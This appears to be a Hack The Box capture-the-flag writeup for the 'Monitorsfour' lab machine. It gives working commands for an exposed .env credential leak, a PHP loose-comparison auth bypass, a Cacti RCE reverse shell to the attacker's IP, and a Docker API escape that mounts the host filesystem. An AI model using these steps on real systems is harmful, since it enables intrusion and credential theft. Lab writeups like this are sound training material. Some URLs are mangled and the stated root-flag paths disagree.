<img width="1281" height="585" alt="image" src="https://github.com/user-attachments/assets/d07332fc-3930-44eb-8c4a-625af0d202fe" /><img width="1281" height="585" alt="image" src="https://github.com/user-attachments/assets/bba27c4b-1c12-49df-bcfa-c1aaf9fb634a" /># Monitoursfour - Hack The Box Writeup

## Machine Info
- **Name:** Monitorsfour
- **IP:** 10.10.11.98
- **OS:** Windows Server (with Docker/WSL2)
- **Difficulty:** Medium
- **Date:** 2026-01-14

## 1. Reconnaissance

### Nmap Scan
We started with a SYN scan with OS detection.

**Command:**
```bash
sudo nmap -sS -O 10.10.11.98
```
<img width="1232" height="481" alt="image" src="https://github.com/user-attachments/assets/0893ef77-046e-47fd-8d89-512f0929095d" />

Result : 

**Open Ports:**
- **80/tcp (HTTP):** Web server
- **5985/tcp (WSMAN):** Windows Remote Management (requires authentication)


## 2. Enumeration

### DNS Configuration
Added target to hosts file:
```bash
echo "10.10.11.98 monitorsfour.htb" | sudo tee -a /etc/hosts
```

### Virtual Host Discovery
Fuzzing for subdomains revealed a Cacti installation.

**Command:**
```bash
gobuster vhost -u http://monitorsfour.htb/ -w subdomains_short.txt --append-domain
```

**Results:**
- **cacti.monitorsfour.htb** (Status: 302)

**Action:**
```bash
echo "10.10.11.98 cacti.monitorsfour.htb" | sudo tee -a /etc/hosts
```

### Directory Fuzzing
Searched for sensitive files on the main site.
<img width="1281" height="585" alt="image" src="https://github.com/user-attachments/assets/a1cc1da8-a2df-4ea1-aebf-dc7f72bc63e4" />

**Command:**
```bash
gobuster dir -u http://monitorsfour.htb/ -w common.txt
```

**Results:**
Found `.env` file containing database credentials:
```bash
curl http://monitorsfour.htb/.env
```

**Output:**
```
DB_HOST=mariadb
DB_PORT=3306
DB_NAME=monitorsfour_db
DB_USER=monitorsdbuser
DB_PASS=f37p2j8f4t0r
```

### Cacti Enumeration
Visited `http://cacti.monitorsfour.htb` and identified:
- **Version:** 1.2.28
- **Vulnerable to:** CVE-2025-24367 (Authenticated RCE), CVE-2024-43363

---


## 3. Exploitation

### PHP Type Juggling (CVE - Loose Comparison)
The `/user` endpoint was vulnerable to PHP loose comparison bypass.

**Vulnerability:**
```php
// Vulnerable code (hypothetical)
if ($_GET['token'] == $valid_token) {  // Loose comparison
    echo json_encode($users);
}
```

**Exploit:**
```bash
curl "http://monitorsfour.htb/user?token=0"
```

**Explanation:**
In PHP, `"any_string" == 0` evaluates to `true`. By sending `token=0`, we bypassed authentication.

**Results:**
Retrieved JSON with 4 users and MD5 password hashes:

| Username | Password Hash (MD5) | Name | Role |
|----------|---------------------|------|------|
| admin | 56b32eb43e6f15395f6c46c1c9e1cd36 | Marcus Higgins | super user |
| mwatson | 69196959c16b26ef00b77d82cf6eb169 | Michael Watson | user |
| janderson | 2a22dcf99190c322d974c8df5ba3256b | Jennifer Anderson | user |
| dthompson | 8d4a7e7fd08555133e056d9aacb1e519 | David Thompson | user |

### Hash Cracking
Cracked the admin hash using CrackStation:
- **Hash:** `56b32eb43e6f15395f6c46c1c9e1cd36`
- **Password:** `wonderful1`

**Credentials:**
- `admin:wonderful1`
- `marcus:wonderful1`

### Cacti RCE (CVE-2025-24367)
Authenticated RCE via graph template newline injection.

**Vulnerability:**
Cacti fails to sanitize newline characters in graph parameters, allowing command injection when `rrdtool` is called.

**Exploitation:**
Used public exploit from GitHub:
```bash
cd /tmp
git clone https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC
cd CVE-2025-24367-Cacti-PoC
pip3 install beautifulsoup4

# Setup listener
nc -lvnp 4444  # Terminal 1

# Run exploit
python3 exploit.py \
  -u marcus \
  -p wonderful1 \
  -i 10.10.14.174 \
  -l 4444 \
  -url http://cacti.monitorsfour.htb  # Terminal 2
```

**Result:**
Successfully obtained reverse shell as `www-data` inside a Docker container.

---

## 4. Privilege Escalation

### Initial Reconnaissance
```bash
whoami  # www-data
hostname  # 821fbd6a43fa (Docker container)
ip a  # 172.18.0.3 (Docker network)
```

### User Flag
Located in the container filesystem:
```bash
cat /home/marcus/user.txt
```
<img width="762" height="282" alt="image" src="https://github.com/user-attachments/assets/5ac48905-c336-4101-9c64-952e304d5e67" />


### Docker Escape (CVE-2025-9074)

The Docker socket was not accessible at `/var/run/docker.sock`, but the Docker Desktop API was exposed on the internal network.

**Network Reconnaissance:**
```bash
# Scan for Docker API on gateway
for p in 2375 2376 2377; do
    (timeout 0.3 bash -c "echo >/dev/tcp/192.168.65.7/$p" 2>/dev/null) && echo "OPEN: $p" || echo "CLOSED: $p"
done
```

**Result:** Port **2375** open (Docker API without authentication)

**Enumerate Docker Images:**
```bash
curl -s http://192.168.65.7:2375/images/json
```

**Exploitation - Create Escape Container:**

1. Create container configuration with host filesystem mounted:
```bash
cat > create_container.json << 'EOF'
{
  "Image": "alpine:latest",
  "Cmd": ["sleep", "infinity"],
  "HostConfig": {
    "Binds": ["/:/mnt/host_root"]
  },
  "Tty": true,
  "OpenStdin": true
}
EOF
```

2. Create and start the container:
```bash
# Create container
curl -H "Content-Type: application/json" \
  -d @create_container.json \
  http://192.168.65.7:2375/containers/create

# Response: {"Id":"cb9e83b09f97...","Warnings":[]}

# Start container
cid=cb9e83b09f97c6e3eeb97c62987e75256840529d0796cba43ec5e392a4950035
curl -X POST http://192.168.65.7:2375/containers/$cid/start
```
3. Locate root flag (initial path failed):
```

# First attempt with simple path failed
# Used find to discover actual filesystem structure
curl -H "Content-Type: application/json" \
  -d '{"Image":"alpine:latest","Cmd":["find","/mnt/host_root/parent-distro","-name","*.txt"],"HostConfig":{"Binds":["/:/mnt/host_root"]}}' \
  [http://192.168.65.7](http://192.168.65.7):2375/containers/create
cid_find=3ee63229edff5f1eb765b3b22882c0506e867175505ce513ff2dae0cd04ddec0
curl -X POST [http://192.168.65.7](http://192.168.65.7):2375/containers/$cid_find/start
sleep 2
curl "[http://192.168.65.7](http://192.168.65.7):2375/containers/$cid_find/logs?stdout=true&stderr=true" 2>/dev/null | strings

Discovery: Actual path is /mnt/host_root/parent-distro/mnt/host/c/Users/Administrator/Desktop/root.txt
**Result:** Root flag retrieved from `/mnt/host_root/Users/Administrator/Desktop/root.txt`

```
 4. Read root flag with the path : 
```
curl -H "Content-Type: application/json" \
  -d '{"Image":"alpine:latest","Cmd":["cat","/mnt/host_root/parent-distro/mnt/host/c/Users/Administrator/Desktop/root.txt"],"HostConfig":{"Binds":["/:/mnt/host_root"]}}' \
  [http://192.168.65.7](http://192.168.65.7):2375/containers/create

cid_root=<NEW_CONTAINER_ID>
curl -X POST [http://192.168.65.7](http://192.168.65.7):2375/containers/$cid_root/start
sleep 2
curl "[http://192.168.65.7](http://192.168.65.7):2375/containers/$cid_root/logs?stdout=true&stderr=true" 2>/dev/null | strings
```
---

## 5. Flags

### User Flag
Located at: `/home/marcus/user.txt` (inside the Docker container)

### Root Flag
Located at: `C:\Users\Administrator\Desktop\root.txt` on the Windows host, accessible via Docker API exec as `/mnt/host_root/Users/Administrator/Desktop/root.txt`

<img width="1141" height="156" alt="image" src="https://github.com/user-attachments/assets/07adb8b2-cbcd-461e-8d8c-bd9c4547ffc2" />

<img width="1200" height="837" alt="image" src="https://github.com/user-attachments/assets/e406e6be-0306-4fcd-8130-9df780a58267" />

---



